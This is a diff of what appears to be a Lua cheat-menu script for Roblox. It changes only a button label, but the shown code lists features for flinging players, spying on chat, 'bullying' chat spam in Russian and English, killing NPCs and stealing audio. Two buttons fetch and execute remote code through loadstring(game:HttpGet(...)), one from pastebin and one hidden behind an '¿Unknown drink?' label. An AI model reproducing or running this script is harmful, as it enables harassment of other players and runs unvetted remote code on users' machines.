@@ -404,7 +404,7 @@ local buttons = {
     ["I"] = {"Fling", "Invisible", "Infinite Yield", "Keyboard", "BTools", "Info Item Name (logs)"},
     ["II"] = {"Telekinesis", "Multi Gear Press (E)", "Multi Gear (Another version)", "Focus(Item)", "Avatar upside down (FE)", "Chat Spy"},
     ["III"] = {"Chat translator", "Bullying Chat Spam (RUS)", "Bullying Chat spam (ENG)", "Kill all NPC", "Bring all NPC", "Anti-AFC"},
-    ["IV"] = {"Audio Stealer", "Click All Buttons", "Touch all walls", "Sword Reach", "r6 animations", "¿Unknown drink?"},
+    ["IV"] = {"Audio Stealer", "Click All Buttons", "Touch all walls", "Sword Reach", "r6/r15 animations", "¿Unknown drink?"},
     ["Information"] = {}
 }
 
@@ -629,7 +629,7 @@ local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
             end
         end
 end)
-                      elseif button.Name == "r6 animations" then
+                      elseif button.Name == "r6/r15 animations" then
                           loadstring(game:HttpGet("https://pastebin.com/raw/RmD3qNp7", true))()
                       elseif button.Name == "¿Unknown drink?" then
                           loadstring(game:HttpGet("https://raw.githubusercontent.com/Tomato2001/Fcbjgdsawfg/main/UedvjdEudwqi1"))()
